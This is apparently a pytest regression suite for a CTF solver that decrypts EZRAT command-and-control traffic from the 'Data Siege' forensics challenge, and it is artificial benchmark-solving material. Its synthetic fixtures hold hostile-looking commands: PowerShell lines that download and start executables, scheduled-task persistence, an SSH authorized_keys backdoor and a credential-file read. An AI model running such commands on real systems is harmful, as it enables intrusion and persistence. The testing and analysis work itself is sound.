# -*- coding: utf-8 -*-
"""misc_pcap_ezrat_chat 求解器回归（2026-10-13）。

覆盖
----
1. 真实题 capture.pcap 解出，sha256 与题库 `flag_sha256` 逐字匹配
   （真值从题目对象读，**不硬编码**）；
2. 负例：非 pcap / 无 TCP 流的 pcapng / 只有文件头诱饵的 pcapng /
   口令与密文不匹配 / 片段歧义 → 一律优雅放弃，不崩不谎报；
3. 生产约束：skill 纯标准库（AST 级 import 扫描；打桩屏蔽三方库后
   仍解出真題——生产子进程是 spawn，任何解释器下须可跑）；
4. 反捷径：skill 源码**不得含 flag 明文或 sha256**（防"查表短路"）；
5. 单测不绕过生产形态：`run()` 契约 + 内嵌函数（pcap/pcapng 解析、
   报文帧识别、AES-256-CBC、PBKDF2 派生、片段装配）各自针对性用例；
6. 合成端到端：自建 pcapng（exe 流 + C2 双向加密流 + powershell 载荷）
   全链路解出，隔离验证「与真实题无关」的求解逻辑；
7. 变异：salt 乱设 / powershell 扫描被摘掉 → 真实题必须解不出
   （证明这些部件真在承载正确性，不是摆设）。

2026-10-13 当日回归重点（第 7 条第二条）
--------------------------------------
初版把 powershell 载荷扫描范围限定在「未被认作报文的残字节」上，但
`powershell`/`.exe`/`-encoded` 每个偏移都有合法却过短的 base64 运行
匹配，被逐字节跳过、落不进残字节；其长 base64 本体又因解码长度恰为
16 字节倍数（或某后缀长度为 64 倍数）被当作密文报文吃掉——残字节视图
对本题型恒为空，第 3 段 flag 永远扫不到。修法：直接扫「重组流缓冲」。
`test_mutation_ps_scan_removed` 与合成端到端共同锁死该回归。
"""

from __future__ import annotations

import base64
import hashlib
import json
import struct
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from skills import misc_pcap_ezrat_chat as M  # noqa: E402

_ROOT = Path(__file__).resolve().parents[1]
_QNAME = "ext_cybench_hackthebox_cyber_apocalypse_2024_forensics_medium_data_siege"
_QJSON = (_ROOT / "data" / "questions_ext_cybench" / "forensics"
          / (_QNAME + ".json"))
_ATT = (_ROOT / "data" / "questions_ext_cybench" / "_attachments" / "forensics"
        / _QNAME.replace("ext_cybench_", "") / "capture.pcap")

# 从题库读真值（缺文件则 skip；cybench 数据 gitignore 不入库）
_TRUTH_SHA = ""
if _QJSON.is_file():
    try:
        _TRUTH_SHA = str(json.loads(_QJSON.read_text(encoding="utf-8"))
                         .get("flag_sha256") or "")
    except Exception:  # noqa: BLE001
        _TRUTH_SHA = ""

needs_question = pytest.mark.skipif(
    not (_ATT.is_file() and _TRUTH_SHA),
    reason="外部题库 data_siege 未落地（gitignore）")

_SYNTH_PW = "Synthet1cPassw0rdXY"


# --------------------------------------------------------------------------
# 合成 pcap/pcapng 夹具构造（测试私有，勿入生产代码）
# --------------------------------------------------------------------------
def _ip4(s: str) -> bytes:
    return bytes(int(x) for x in s.split("."))


def _tcp_frame(src_ip, sport, dst_ip, dport, payload: bytes) -> bytes:
    tcp = struct.pack(">HHIIBBHHH", sport, dport, 1, 1, 0x50, 0x18,
                      0xFFFF, 0, 0) + payload
    total = 20 + len(tcp)
    ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, total, 0, 0, 64, 6, 0,
                     _ip4(src_ip), _ip4(dst_ip)) + tcp
    return b"\xff\xff\xff\xff\xff\xff" + b"\x02\x00\x00\x00\x00\x02" \
        + b"\x08\x00" + ip


def _udp_frame(src_ip, sport, dst_ip, dport) -> bytes:
    udp = struct.pack(">HHHH", sport, dport, 8, 0)
    ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + len(udp), 0, 0, 64,
                     17, 0, _ip4(src_ip), _ip4(dst_ip)) + udp
    return b"\xff\xff\xff\xff\xff\xff" + b"\x02\x00\x00\x00\x00\x02" \
        + b"\x08\x00" + ip


def _png_block(btype: int, body: bytes) -> bytes:
    pad = (-len(body)) % 4
    blen = 12 + len(body) + pad
    return struct.pack("<II", btype, blen) + body + b"\x00" * pad \
        + struct.pack("<I", blen)


def _pcapng(frames, linktype: int = 1, shb_extra: bytes = b"") -> bytes:
    shb_body = struct.pack("<IHHq", 0x1A2B3C4D, 1, 0, -1) + shb_extra
    idb_body = struct.pack("<HHI", linktype, 0, 0xFFFF)
    out = _png_block(0x0A0D0D0A, shb_body) + _png_block(0x00000001, idb_body)
    for fr in frames:
        epb_body = struct.pack("<IIIII", 0, 0, 0, len(fr), len(fr)) + fr
        out += _png_block(0x00000006, epb_body)
    return out


def _classic_pcap(frames, linktype: int = 1, endian: str = "<") -> bytes:
    magic = b"\xd4\xc3\xb2\xa1" if endian == "<" else b"\xa1\xb2\xc3\xd4"
    out = magic + struct.pack(endian + "HHiIII", 2, 4, 0, 0, 0xFFFF, linktype)
    for i, fr in enumerate(frames):
        out += struct.pack(endian + "IIII", i, 0, len(fr), len(fr)) + fr
    return out


def _enc_b64(pt: bytes, password: str) -> bytes:
    """用被测 skill 自己的 PBKDF2 派生 + pycryptodome AES-CBC 造密文夹具。"""
    Crypto = pytest.importorskip("Crypto.Cipher.AES")
    key, iv = M._derive(password)
    pad = 16 - len(pt) % 16
    ct = Crypto.new(key, Crypto.MODE_CBC, iv).encrypt(pt + bytes([pad]) * pad)
    return base64.b64encode(ct)


def _framed(b64: bytes) -> bytes:
    return str(len(b64)).encode() + b"\xa7" + b64


def _synthetic_pcap(password: str, msg_password: str) -> bytes:
    """合成一道「迷你 data_siege」：exe 流带口令 + C2 双向加密流 +
    powershell -encoded 载荷（其 base64 解码长度恰为 16 倍数——会被
    报文解析器当作密文吃掉，正是当日 bug 的触发形态）。"""
    frames = []
    # 流 0：exe 下载（口令以 .NET UTF-16LE 形态藏在字节里）
    exe = b"MZ\x90\x00" + b"\x00" * 32 \
        + password.encode("utf-16-le") + b"\x00" * 32 + b"PE\x00\x00"
    frames.append(_tcp_frame("10.0.0.2", 8000, "10.0.0.1", 49666, exe))
    # 流 1：C2 服务→客（带帧）
    pt1 = b"cmd;C:\\;echo HTB{synthet1c_piece >> C:\\Users\\x\\.ssh\\authorized_keys"
    pt2 = b"cmd;C:\\;type C:\\creds.txt\r\n\r\n2nd flag part: m1ddle_piece"
    pt3 = b"cmd;C:\\;dir C:\\Users\\x\\Documents"
    for pt in (pt1, pt2, pt3):
        frames.append(_tcp_frame("10.0.0.1", 1234, "10.0.0.2", 49680,
                                 _framed(_enc_b64(pt, msg_password))))
    # powershell 持久化脚本（第 3 段在 TaskName 里）；UTF-16LE 长度凑 16 倍数
    script = (
        "(New-Object System.Net.WebClient).DownloadFile"
        "(\"http://x/y.exe\", \"C:\\y.exe\")\r\n"
        "\r\n"
        "# 3th flag part:\r\n"
        "\r\n"
        "Register-ScheduledTask -TaskName \"cl0s1ng_piece}\" -Action $a\r\n"
    )
    while len(script) % 8:
        script += "\n"
    ps = b"powershell.exe -encoded \"" \
        + base64.b64encode(script.encode("utf-16-le")) + b"\""
    frames.append(_tcp_frame("10.0.0.1", 1234, "10.0.0.2", 49680, ps))
    # 流 2：C2 客→服（裸 base64，无帧）
    pt4 = b"infoback;0;10.0.0.2|SYNTH|SYNTH\\svc01|Windows 10|0.1.6.1"
    frames.append(_tcp_frame("10.0.0.2", 49680, "10.0.0.1", 1234,
                             _enc_b64(pt4, msg_password)))
    return _pcapng(frames)


# --------------------------------------------------------------------------
# 1) 真实题解出
# --------------------------------------------------------------------------
@needs_question
def test_solves_real_capture_pcap():
    out = M.run({"path": str(_ATT)})
    flag = (out or {}).get("flag")
    assert flag, "skill 未解出 data_siege"
    assert M._FLAG_SHAPE_RE.fullmatch(flag.encode()), f"形态不合法: {flag!r}"
    assert hashlib.sha256(flag.encode()).hexdigest() == _TRUTH_SHA


# --------------------------------------------------------------------------
# 2) 合成端到端（隔离验证求解逻辑，不依赖真实题）
# --------------------------------------------------------------------------
def test_synthetic_ezrat_end_to_end(tmp_path):
    pcap = tmp_path / "synthetic.pcapng"
    pcap.write_bytes(_synthetic_pcap(_SYNTH_PW, _SYNTH_PW))
    out = M.run({"path": str(pcap)})
    flag = (out or {}).get("flag")
    assert flag == "HTB{synthet1c_piecem1ddle_piececl0s1ng_piece}", \
        f"合成题解出异常: {flag!r}"


def test_synthetic_wrong_key_gives_up(tmp_path):
    """pcap 里候选口令是真的，但密文用另一把钥匙加密 → 必须放弃。"""
    pcap = tmp_path / "wrongkey.pcapng"
    pcap.write_bytes(_synthetic_pcap(_SYNTH_PW, "OtherPassword12345"))
    assert M.run({"path": str(pcap)})["flag"] is None


# --------------------------------------------------------------------------
# 3) 负例
# --------------------------------------------------------------------------
def test_negative_non_pcap(tmp_path):
    junk = tmp_path / "junk.bin"
    junk.write_bytes(b"not a pcap at all" * 64)
    assert M.run({"path": str(junk)})["flag"] is None


def test_negative_pcapng_without_tcp(tmp_path):
    """有合法 pcapng 结构但只有 UDP 帧 → 无 TCP 流 → 放弃。"""
    pcap = tmp_path / "udp.pcapng"
    pcap.write_bytes(_pcapng([_udp_frame("10.0.0.1", 53, "10.0.0.2", 5353)]))
    assert M.run({"path": str(pcap)})["flag"] is None


def test_negative_decoy_only_pcapng(tmp_path):
    """文件头带 Npcap 设备 GUID 诱饵（`\\Device\\NPF_{846E...}`）但无任何
    流量 → 必须放弃。宽泛 flag 正则会误抓文件头，本 skill 只从解密明文
    提片段，从设计上不碰它。"""
    decoy = b"\x00\x04\x00\x30\x00\x00\x00\x00" \
        + b"\\Device\\NPF_{846E2832-1111-2222-3333-444455556666}\x00\x00\x00\x00"
    pcap = tmp_path / "decoy.pcapng"
    pcap.write_bytes(_pcapng([], shb_extra=decoy))
    assert M.run({"path": str(pcap)})["flag"] is None


def test_run_contract_missing_and_empty(tmp_path):
    assert M.run({})["flag"] is None
    assert M.run({"path": ""})["flag"] is None
    assert M.run({"paths": []})["flag"] is None
    assert M.run({"path": str(tmp_path / "nonexistent.pcap")})["flag"] is None


def test_negative_oversize_rejected(tmp_path):
    """>8MB 附件直接拒（与 presolve 预检一致的双保险）。"""
    big = tmp_path / "big.pcap"
    big.write_bytes(b"\x0a\x0d\x0d\x0a" + b"\x00" * (8 * 1024 * 1024))
    assert M.solve([str(big)]) is None


# --------------------------------------------------------------------------
# 4) 解析层单测
# --------------------------------------------------------------------------
def test_parse_segment_framed_and_bare():
    ct = bytes(range(16))
    b64 = base64.b64encode(ct)
    framed = str(len(b64)).encode() + b"\xa7" + b64
    assert M._parse_segment(framed) == [(0, ct)]
    assert M._parse_segment(b64) == [(0, ct)]
    assert M._parse_segment(b"hello world, no messages here") == []
    # 帧长非 4 倍数 / 过短 → 不当帧，退回裸 base64 识别（b64 起点在偏移 2）
    bad_frame = b"7\xa7" + b64
    assert M._parse_segment(bad_frame) == [(2, ct)]


def test_stream_messages_cross_segment_merge():
    """报文跨段时最多向后合并 3 段重试（本题每段恰一条，不触发边界，
    但合并兜底必须健在）。"""
    ct = bytes(range(16))
    b64 = base64.b64encode(ct)
    seg1 = str(len(b64)).encode() + b"\xa7" + b64[:10]
    seg2 = b64[10:]
    msgs = M._stream_messages([seg1, seg2])
    assert msgs == [(0, ct)]


def test_streams_pcapng_and_classic_both_endians():
    payload = b"payload-abcdefghijklmnop"
    fr = _tcp_frame("10.0.0.1", 1234, "10.0.0.2", 49680, payload)
    for data in (_pcapng([fr]), _classic_pcap([fr]),
                 _classic_pcap([fr], endian=">")):
        streams = M._streams(data)
        assert len(streams) == 1, f"解析失败: {data[:8]!r}"
        assert streams[0][1] == [payload]


def test_ps_regex_requires_encoded_switch():
    """ActiveMQ 回包里的 `powershell Invoke-WebRequest '...'` 不含
    -e/-enc/-encoded → 不得命中（不对无关流量开火）。"""
    xml = (b"powershell Invoke-WebRequest 'http://10.10.10.21:8000/aQ4caZ.exe'"
           b" -OutFile 'C:\\temp\\aQ4caZ.exe'; Start-Process 'c:\\temp\\aQ4caZ.exe'")
    assert M._PS_ENCODED_RE.search(xml) is None


# --------------------------------------------------------------------------
# 5) 密码学单测（纯 Python 实现的已知向量 + 三方库交叉验证）
# --------------------------------------------------------------------------
def test_aes256_fips197_known_vector():
    """FIPS-197 AES-256 已知向量：密文 → 明文必须逐字还原。"""
    key = bytes(range(32))
    ct = bytes.fromhex("8ea2b7ca516745bfeafc49904b496089")
    pt = bytes.fromhex("00112233445566778899aabbccddeeff")
    assert M._decrypt_block(ct, M._expand_key(key)) == pt


def test_cbc_decrypt_matches_pycryptodome():
    Crypto = pytest.importorskip("Crypto.Cipher.AES")
    key, iv = M._derive(_SYNTH_PW)
    ct = bytes((i * 37 + 11) % 256 for i in range(48))
    ref = Crypto.new(key, Crypto.MODE_CBC, iv).decrypt(ct)
    assert M._cbc_decrypt(ct, key, iv) == ref


def test_derive_uses_ezrat_family_constants():
    """salt/迭代数/dkLen 必须等于公开源码 EZRAT Constants.cs 的值，
    且 key/IV = 同一条 48 字节 PBKDF2 流的前 32 / 次 16。"""
    dk = hashlib.pbkdf2_hmac("sha1", _SYNTH_PW.encode("utf-8"),
                             b"Very_S3cr3t_S", 1000, 48)
    key, iv = M._derive(_SYNTH_PW)
    assert M._EZRAT_SALT == b"Very_S3cr3t_S"
    assert M._EZRAT_ITERATIONS == 1000
    assert M._EZRAT_DKLEN == 48
    assert (key, iv) == (dk[:32], dk[32:48])


def test_pkcs7_unpad():
    assert M._pkcs7_unpad(b"abc" + bytes([13]) * 13) == b"abc"
    assert M._pkcs7_unpad(b"no padding here!!") == b"no padding here!!"
    assert M._pkcs7_unpad(b"") == b""


# --------------------------------------------------------------------------
# 6) 片段装配单测（fail-closed 语义）
# --------------------------------------------------------------------------
def test_assemble_happy_path():
    texts = [b"echo HTB{abc123 >> file",
             b"2nd flag part: m1ddle",
             b'Register-ScheduledTask -TaskName "cl0s3}"']
    assert M._assemble(texts) == b"HTB{abc123m1ddlecl0s3}"


def test_assemble_returns_full_flag_directly():
    assert M._assemble([b"noise", b"HTB{full_flag_here}", b"more"]) \
        == b"HTB{full_flag_here}"


def test_assemble_fail_closed_on_ambiguity():
    # >2 个开口 → 歧义放弃
    assert M._assemble([b"HTB{one", b"HTB{two", b"HTB{three", b"end}"]) is None
    # 有开口无闭口 → 放弃
    assert M._assemble([b"HTB{one", b"mid"]) is None
    # 无开口有闭口 → 放弃
    assert M._assemble([b"mid", b"end}"]) is None


def test_labeled_re_ignores_trailing_colon_line():
    """`# 3th flag part:` 单独成行时下一字符是换行 → 不当中段捕
    （否则第 3 段会被重复拼进 flag）。"""
    assert M._LABELED_RE.search(b"# 3th flag part:\r\nRegister-ScheduledTask") \
        is None
    assert M._LABELED_RE.search(b"2nd flag part: m1ddle").group(1) == b"m1ddle"


# --------------------------------------------------------------------------
# 7) 生产约束 + 反捷径
# --------------------------------------------------------------------------
def test_no_third_party_imports_in_source():
    """AST 级检查：skill 只许 import 标准库（spawn 子进程须任何解释器
    可跑）。不能用子串扫描——docstring 里「无 pycryptodome」的说明
    文字会误伤。"""
    import ast

    src = (_ROOT / "skills" / "misc_pcap_ezrat_chat.py").read_text(encoding="utf-8")
    tree = ast.parse(src)
    roots = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            roots.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            roots.add(node.module.split(".")[0])
    allowed = {"__future__", "base64", "hashlib", "itertools", "os", "re",
               "struct"}
    extra = roots - allowed
    assert not extra, f"skill 出现非标准库 import: {sorted(extra)}"


@needs_question
def test_solves_with_third_party_imports_blocked(monkeypatch):
    """打桩屏蔽 Crypto/cryptography/numpy/scapy 后仍解出——证明无隐藏
    三方依赖（生产子进程是 spawn，不继承 dev venv）。"""
    real_import = __import__

    def guarded(name, *a, **kw):
        root = name.split(".")[0]
        if root in ("Crypto", "Cryptodome", "cryptography", "numpy",
                    "scapy", "PIL", "cv2"):
            raise ImportError(f"blocked by test: {name}")
        return real_import(name, *a, **kw)

    monkeypatch.setattr("builtins.__import__", guarded)
    out = M.run({"path": str(_ATT)})
    flag = (out or {}).get("flag")
    assert flag
    assert hashlib.sha256(flag.encode()).hexdigest() == _TRUTH_SHA


@needs_question
def test_no_flag_plaintext_or_sha_in_source():
    src = (_ROOT / "skills" / "misc_pcap_ezrat_chat.py").read_text(encoding="utf-8")
    assert _TRUTH_SHA not in src, "skill 源码含 sha256 —— 疑似查表短路"
    out = M.run({"path": str(_ATT)})
    flag = (out or {}).get("flag")
    if flag:
        assert flag not in src, "skill 源码含 flag 明文 —— 疑似查表短路"


# --------------------------------------------------------------------------
# 8) 变异：这些部件必须真在承载正确性
# --------------------------------------------------------------------------
@needs_question
def test_mutation_wrong_salt(monkeypatch):
    """salt 乱设 → PBKDF2 派生错钥匙 → 真实题必须解不出。"""
    monkeypatch.setattr(M, "_EZRAT_SALT", b"Wrong_Salt_XXX")
    assert M.run({"path": str(_ATT)})["flag"] is None


@needs_question
def test_mutation_ps_scan_removed(monkeypatch):
    """powershell 载荷扫描被摘掉 → 第 3 段 flag 丢失 → 真实题必须解不出。

    这是 2026-10-13 当日 bug 的回归守卫：初版把扫描范围限定在
    「未认作报文的残字节」上，而该残字节对本题型恒为空（前缀被逐字节
    跳过、长 base64 被当作密文吃掉），第 3 段因此永远扫不到。
    """
    import re as _re

    monkeypatch.setattr(M, "_PS_ENCODED_RE", _re.compile(rb"(?!x)x"))
    assert M.run({"path": str(_ATT)})["flag"] is None
